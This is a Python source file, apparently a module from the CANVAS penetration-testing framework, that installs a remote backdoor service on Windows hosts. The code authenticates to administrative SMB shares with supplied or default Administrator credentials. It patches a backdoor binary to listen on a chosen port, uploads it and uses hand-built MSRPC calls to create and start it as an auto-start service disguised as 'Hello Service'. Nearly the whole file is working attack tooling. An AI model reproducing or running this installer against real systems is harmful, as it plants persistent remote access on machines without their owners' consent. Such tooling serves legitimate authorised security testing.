#! /usr/bin/env python

NOTES = """
Installs a remote MOSDEF service by uploading it and then starting it

For Win32
   This module uses SMB to upload the service using a given username and password. It then
   uses the service control manager to start the service.
   
   The MOSDEFService itself is modified to listen on whatever port the user wishes.
"""

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import struct
import time

from exploitutils import *
from tcpexploit import *
import msrpc
from libs.dcemarshall import *
from MOSDEF import mosdef

# GUI info
NAME                            = "Install Remote MOSDEF Service"
DESCRIPTION                     = "Installs remote MOSDEF service over SMB"
VERSION                         = "0.1"

DOCUMENTATION                   = {}
DOCUMENTATION["Repeatability"]  = "once"
DOCUMENTATION["Notes"]          = "This will change directory to the systemroot on windows. Don't run it at the same time as a module that wants to stay in another directory. This will fail on Windows XP due to SMB login credential semantics."

PROPERTY                        = {}
PROPERTY['TYPE']                = "Trojans"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Windows", "i386"] ]
                                                                                
antispywarelist                 = ["gcasDtServ.exe","gcasServ.exe"]

# defines
from win32MosdefShellServer import SC_MANAGER_CREATE_SERVICE
from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
from win32MosdefShellServer import SERVICE_AUTO_START
from win32MosdefShellServer import SERVICE_ERROR_IGNORE
from win32MosdefShellServer import SERVICE_ALL_ACCESS
from win32MosdefShellServer import SERVICE_BOOT_START
from win32MosdefShellServer import SERVICE_AUTO_START

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.version                = 0
        self.host                   = ""
        self.port                   = 5555
        self.name                   = NAME
        self.destdir                = {}
        self.destdir["win32"]       = "%SYSTEMROOT%"
        self.sourceDict             = {}
        self.sourceDict["win32"]    = "backdoors/mosdefservice.exe"
        self.binaryName             = "mosdefservice.exe"
        self.serviceName            = "helloservice"
        self.displayName            = "Hello Service"
        self.killantispyware        = 0
        self.ignoreantispyware      = 0
        self.msrpcuser              = "Administrator"
        self.msrpcpassword          = "jbone"
        self.domain                 = ""
        return
    
    def test(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        s = self.connectTo(self.host,self.port)
        if s:
            self.log("Something is already listening on that port!")
            return 0 
        return 1

    def getargs(self):
        self.host               = self.target.interface 
        self.port               = int(self.argsDict.get("port", self.port))
        self.displayName        = self.argsDict.get("displayName",self.displayName)
        self.serviceName        = self.argsDict.get("serviceName",self.serviceName)
        self.binaryName         = self.argsDict.get("binaryName",self.binaryName)
        self.ignoreantispyware  = self.argsDict.get("ignoreantispyware",self.ignoreantispyware)
        self.killantispyware    = self.argsDict.get("killantispyware",self.killantispyware)
        self.password           = self.argsDict.get("password", self.password)
        self.msrpcuser          = self.argsDict.get("msrpcuser", self.msrpcuser)
        self.msrpcpassword      = self.argsDict.get("msrpcpassword", self.msrpcpassword)
        self.domain             = self.argsDict.get("domain",self.domain)
        return
    
    def run(self):
        self.getargs()

        if self.serviceName.count(" "):
            self.log("Service Name can't have spaces!")
            return 0

        self.password = self.password[:32] #32 bytes long always
        self.password = stroverwrite("\x00"*32,self.password,0) #pad to 32 bytes of zeros

        self.log("Using password: %s" % prettyprint(self.password))

        node    = self.argsDict["passednodes"][0]
        s       = self.gettcpsock()
        try:
            ret = s.connect((self.host,self.port))
        except:
            # timed out, or socket.error
            ret = -1

            # hmm, win32 is going to bite us here. We really want to differentiate
            # a TIMEOUT exception from a connection refused exception...
            
        self.log("Socket connect on node %s returned: %s"%(node.getname(), ret))

        if ret != -1:
            self.log("Node %s has port %d already in use"%(node.getname(), self.port))
            return 0

        nodeos = "win32"
        
        self.log("Using Windows MOSDEF Service")
        self.log("Trying to log into ADMIN$/C/D file share")

        vfs = None
        for sharename in ["ADMIN$","C$","D$"]:
            vfs = self.exploitnodes("smbclient",[node],{"password":self.msrpcpassword,"user":self.msrpcuser, "filename": sharename, "domain": self.domain})
            if len(vfs):
                if len(vfs[0]):
                    vfs = vfs[0][0]
                else:
                    self.log("Failed to get into that file share...")
                    vfs = None
                    continue

            self.log("VFS=%s"%vfs)

            if vfs:
                self.log("We managed to get into a share on %s!"%self.host)
                self.log("Sharename: %s Username: %s Password: %s"%(sharename,self.msrpcuser,self.msrpcpassword))
                break

        if not vfs:
            self.log("Failed: Could not get into a share to upload our file!")
            return 0
            
        # now we need to transform our input file such that it uses the new port
        sourcefile  = self.sourceDict[nodeos]
        data        = file(sourcefile,"rb").read()

        # replace push 5555 with push self.port
        self.log("Using port %d for MOSDEFService"%self.port)
        data                = data.replace(mosdef.assemble("push $5555", "X86"), mosdef.assemble("push $%d"%self.port, "X86"))
        oldpassword         = "A"*16 + "B"*16
        data                = data.replace(oldpassword, self.password)
        modified_sourcefile = sourcefile+".port_%d"%self.port
        outfd               = file(modified_sourcefile,"wb+")
        outfd.write(data)
        outfd.close()

        # now we've written to modified_sourcefile, so we need to use that as our upload src
        upload = self.engine.getModuleExploit("upload")

        self.log("Uploading with VFS: %s" % vfs)

        upload.link(self, nodes=[vfs])
        upload.argsDict["source"]       = modified_sourcefile
        upload.argsDict["destfilename"] = self.binaryName
        
        self.log("Uploading file %s to %s"%(modified_sourcefile,self.binaryName))
        
        ret = upload.run()
        self.log("upload.result: %s"%ret)
        if not ret:
            self.log("Could not upload file!")
            return 0
            
        self.log("We were able to upload the file and now we must create a new service that points to it")
            
        ret = self.OpenSCManager(self.host,access=SC_MANAGER_CREATE_SERVICE)
        if not ret:
            self.log("Was unable to open SCManager")
            return 0

        scm             = ret
        servicename     = self.serviceName
        displayname     = self.displayName
        desiredaccess   = SERVICE_ALL_ACCESS
        atype           = SERVICE_WIN32_OWN_PROCESS
        errorcontrol    = SERVICE_ERROR_IGNORE
        binarypath      = self.binaryName
        #SERVICE_BOOT_START will cause an invalid parameter error, dunno why
        starttype       = SERVICE_AUTO_START

        if sharename == "ADMIN$":
            binarypath = "%SYSTEMROOT%\\"+binarypath
        else:
            binarypath = sharename[0]+"\\"+binarypath
                
        loadorder           = 0
        dependancies        = None
        servicesstartname   = self.serviceName
        password            = None

        self.log("ServiceName=%s DisplayName=%s BinaryPath=%s"%(self.serviceName,displayname,binarypath))
        
        ret = self.CreateService(scm,servicename,displayname,desiredaccess,atype,starttype,errorcontrol,binarypath,loadorder,dependancies,servicesstartname,password)
        if ret not in [0,0x431]: #service created/service already existed
            self.log("Was unable to call CreateService")
            return 0

        self.log("Called create service successfully: %x"%ret)
            
        #locally I don't believe we need to open the service, since
        #we already have a handle to it...
        #but remotely I'm not sure - so we'll call OpenService
        ret,handler = self.OpenService(scm,servicename,SERVICE_ALL_ACCESS) 
        if ret not in [0]:
            self.log("Was unable to call OpenService!")
            return 0
            
        # so let's just start it up!
        # self.log("Handler=%s"%prettyhexprint(handler))
        ret = self.StartService(handler)

        self.log("StartService returned %x " % ret)
        
        if ret == 0:
            self.log("Successfully installed and started the MOSDEF service.")
        else:
            self.log("There was an error starting the MOSDEF service.")
            self.log("Error 5 is 'access denied' but typically means that for some reason the file did not run properly. For example, it may be truncated or corrupted!")
           
        ret = self.CloseServiceHandle(handler)           
        ret = self.CloseServiceHandle(scm)
                           
        return 1


    ################## 
    ### MSRPC Routines
    ##################
    
    from win32MosdefShellServer import GENERIC_READ
    def createOpenSCMPkt(self, machinename=None, databasename=None, accessmask=GENERIC_READ):
        marshaller  = dcemarshaller()
        data        = ""
        data        += wchar_t(machinename,["unique"],marshaller).marshall()
        data        += wchar_t(databasename,["unique"],marshaller).marshall()
        data        += dceint(accessmask,[],marshaller).marshall() 
        return data
    
    def parseOpenSCMPkt(self, buf):
        """
        parses the buffer sent back to use by the msrpc server 
        """

        # 4 bytes of pointer data (null? wth?)
        # then 16 bytes of policy handle data
        policyhandle    = buf[0:20]
        returnvalue     = istr2int(buf[20:24])

        # returns 0 on success
        if returnvalue != 0:
            success = 0
            self.log("parseOpenSCMPkt return value not 0!: %x" % returnvalue)
            if returnvalue == 0x6e5:
                self.log("Could not impersonate user for some reason")
        else:
            success = 1
        return success,policyhandle
        
    def OpenSCManager(self, host, access=0):
        """
        opens a remote Service Control Manager
        Returns 0 on failure
        
        On Windows 2000 this will connect to services.exe, which will then
        call OpenSCManager for you. Actually it doesn't call the routine
        itself. It appears to call some other routine internally that does the
        real work. So you can't breakpoint on OpenSCManager or CreateServiceW
        (sorry)
        
        If you breakpoint on OpenSCManager, and you aren't seeing it get called, then that's normal.

        Try breakpointing on RPCImpersonateClient and seeing what is
        going on there. 
        
        """
        self.log("Using msrpcuser: %s msrpcpassword: %s"%(self.msrpcuser,self.msrpcpassword))
        connectionList  = ["ncacn_np:%s[\\svcctl]"% (host)]
        self.myDCE      = msrpc.DCE("367abb81-9844-35f1-ad32-98f038001003", "2.0", connectionList, covertness = self.covertness, getsock=self)
        self.myDCE.setUsername(self.msrpcuser)
        self.myDCE.setPassword(self.msrpcpassword)
        self.myDCE.setDomain(self.domain)
        
        try:
            map = self.myDCE.connect()
            if not map:
                self.raiseError("Could not connect to remote server - service is not running or the host is firewalled.")
        except Exception, msg:
            self.log(msg)	
            return 0

        self.log("Successfully connected to service control manager pipe")
        
        pkt = self.createOpenSCMPkt(accessmask=access)

        self.log("OpenSCManager sending %d bytes"%len(pkt))
        
        # send to function_09
        ret = msrpc.get_all_stubs(self.myDCE.call(15, pkt, response=1))
        
        # get result, parse result
        success,policy_handle = self.parseOpenSCMPkt(ret)
        if not success:
            return ""

        return policy_handle
    
    def createCreateServicePkt(self,scm,servicename,displayname,desiredaccess,atype,starttype,errorcontrol,binarypath,loadorder,dependancies,servicestartname,password):
        data                = ""
        marshaller          = dcemarshaller()
        data                += scm #policy handle (usually starts with \x00*4)
        data                += wchar_t(msunistring(servicename),["unique"],marshaller).marshall()
        data                += dcepointer(wchar_t(msunistring(displayname),[],marshaller),["unique"],marshaller).marshall()
        desiredaccess       = 0x0f01ff
        data                += dceint(desiredaccess,[],marshaller).marshall() 
        data                += dceint(atype,[],marshaller).marshall() 
        data                += dceint(starttype,[],marshaller).marshall() 
        data                += dceint(errorcontrol,[],marshaller).marshall() 
        data                += wchar_t(msunistring(binarypath),["unique"],marshaller).marshall()
        data                += dcepointer(wchar_t(msunistring(loadorder),[],marshaller),[],marshaller).marshall()
        data                += dcepointer(wchar_t(msunistring(dependancies),[],marshaller),[],marshaller).marshall()
        servicestartname    = 0
        data                += dcepointer(wchar_t(msunistring(servicestartname),[],marshaller),[],marshaller).marshall()
        data                += dcepointer(wchar_t(msunistring(password),[],marshaller),[],marshaller).marshall()
        data                += intel_order(0)*3
        return data
    
    def parseCreateServicePkt(self,stub):
        """
        Parses the data sent back to us from a successful call to CreateServiceW
        last dword is return value - NULL is success, else, is errno
        
        On success returns <0><0><16 bytes of something><0>
        """
        if len(stub)<4:
            self.log("Error: CreateServicePkt is not long enough!")
            return -1
        
        ret = istr2int(stub[-4:])
        
        if ret == 0x57:
            self.log("Invalid parameter")

        if ret == 0x431:
            self.log("Error service exists!")
        
        return ret
    
    def CreateService(self,scm,servicename,displayname,desiredaccess,atype,starttype,errorcontrol,binarypath,loadorder,dependancies,servicesstartname,password):
        """
        host is the host to connect to
        scm is the string for our scm pointer
        """
        #the SCM value is specific to a connection...so you can't reconnect here
        pkt = self.createCreateServicePkt(scm,servicename,displayname,desiredaccess,atype,starttype,errorcontrol,binarypath,loadorder,dependancies,servicesstartname,password)
        
        self.log("CreateService sending %d bytes" % len(pkt))

        #send to function_0b
        ret     = msrpc.get_all_stubs(self.myDCE.call(12, pkt, response=1))
        error   = self.parseCreateServicePkt(ret)

        return error
    
    def OpenServiceWPkt(self,scm,servicename,access):
        """
        Creates a OpenServiceW packet for use in sending down the wire
        """
        data        = ""
        marshaller  = dcemarshaller()
        data        += scm #policy handle (usually starts with \x00*4)
        #this one does NOT have a pointer associated with it
        data        += wchar_t(msunistring(servicename),[],marshaller).marshall()
        data        += dceint(access,[],marshaller).marshall() 
        
        return data
    
    def parseOpenServicePkt(self,data):
        """
        Parses the MSRPC stub returned by a OpenServiceW call
        """
        if len(data) < 24:
            self.log("OpenService Packet not long enough: %d"%len(data))
            return -1,None

        handler = data[:20]
        ret     = istr2int(data[-4:])

        return ret,handler
    
    def OpenService(self,scm,servicename,access):
        """
        Calls OpenServiceW remotely on a host - but of course, requires that self.myDCE is already set up...
        """
        pkt = self.OpenServiceWPkt(scm,servicename,access)

        self.log("OpenServiceW sending %d bytes" % len(pkt))
        
        #send to function_10
        ret         = msrpc.get_all_stubs(self.myDCE.call(0x10, pkt, response=1))
        ret,handler = self.parseOpenServicePkt(ret)

        return ret,handler
    
    def StartServicePkt(self,handler,args=[]):
        """
        Creates a StartService packet for use in sending down the wire
        """
        data        = ""
        marshaller  = dcemarshaller()
        data        += handler #policy handle (usually starts with \x00*4)
        data        += dceint(len(args),[],marshaller).marshall() 

        if len(args) != 0:
            self.log("Marshalling complex array - untested")

            data    += dceint(0xbadf00d,[],marshaller).marshall()  #pointer
            data    += dceint(len(args),[],marshaller).marshall()  #length of array
            data2   = ""
            i = 1
            for anarg in args:
                data    += dceint(0xbadf00d+i,[],marshaller).marshall()  #pointer
                data2   += wchar_t(msunistring(anarg),[],marshaller).marshall()
                i       += 1
            data += data+data2

        else:
            #nothing in array...
            data += dceint(0,[],marshaller).marshall()  #null pointer 

        return data
    
    def parseStartServicePkt(self,data):
        """
        Parses the MSRPC stub returned by a StartService call
        """
        if len(data) < 4:
            self.log("StartService Packet not long enough: %d"%len(data))
            return -1

        ret = istr2int(data[-4:])
        
        if ret == 0x420:
            self.log("A instance of this service is already running...")
        
        return ret
    
    def StartService(self,handle):
        """
        Calls OpenServiceW remotely on a host - but of course, requires that self.myDCE is already set up...
        returns 0 if we timeout and can't tell that it worked
        """
        pkt = self.StartServicePkt(handle)

        self.log("StartService sending %d bytes"%len(pkt))
        
        try:
            ret = msrpc.get_all_stubs(self.myDCE.call(19, pkt, response=1))
        except:
            self.log("Timed out while starting the service...this is common")
            ret = ""

        if ret:
            ret = self.parseStartServicePkt(ret)
        else:
            ret = 0

        return ret
    
    def CloseServiceHandlePkt(self,handle):
        """
        Creates a OpenServiceW packet for use in sending down the wire
        """
        data        = ""
        marshaller  = dcemarshaller()
        data        += handle #policy handle (usually starts with \x00*4)

        return data
    
    def parseCloseServiceHandlePkt(self,data):
        """
        Parses the MSRPC stub returned by a StartService call
        """
        if len(data) < 4:
            self.log("CloseServiceHandle Packet not long enough: %d"%len(data))
            return -1

        ret = istr2int(data[-4:])

        return ret
    
    def CloseServiceHandle(self,handle):
        """
        Calls CloseServiceHandle remotely on a host - but of course, requires that self.myDCE is already set up...
        """
        pkt = self.CloseServiceHandlePkt(handle)

        self.log("CloseServiceHandle sending %d bytes"%len(pkt))
        
        ret = msrpc.get_all_stubs(self.myDCE.call(0, pkt, response=1))
        ret = self.parseCloseServiceHandlePkt(ret)

        return ret
    
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
        
                
                  


    
        
    
    
